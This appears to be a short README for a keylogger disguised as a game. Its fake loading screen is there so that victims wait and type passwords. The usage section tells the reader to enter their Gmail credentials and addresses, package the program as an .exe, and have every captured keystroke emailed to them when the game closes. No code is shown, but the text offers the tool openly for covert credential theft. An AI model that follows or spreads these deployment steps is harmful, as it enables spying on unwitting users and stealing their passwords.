Deal with it.

The loading screen isn't actually loading anything, it's just there so that people will wait and go and do stuff (hopefully type in passwords and stchuff)

Usage
-----

Just replace the variable username and password with your username (john.smith@gmail.com) and your password (password12345). You must use a gmail account, or
you can modify the code to hook into the Yahoo! SMTP server if you want, shouldn't be very hard.. Also change FROMADDR and TOADDR to the corresponding email addresses.
Then package it into a .exe or what ever if you want and when the user exits the game all of the keys typed during the time the game was open will be emailed to you

It'd be cool if you credit me for anything you seriously use this code in though, just link my github :) If you don't wanna do that, that's cool.
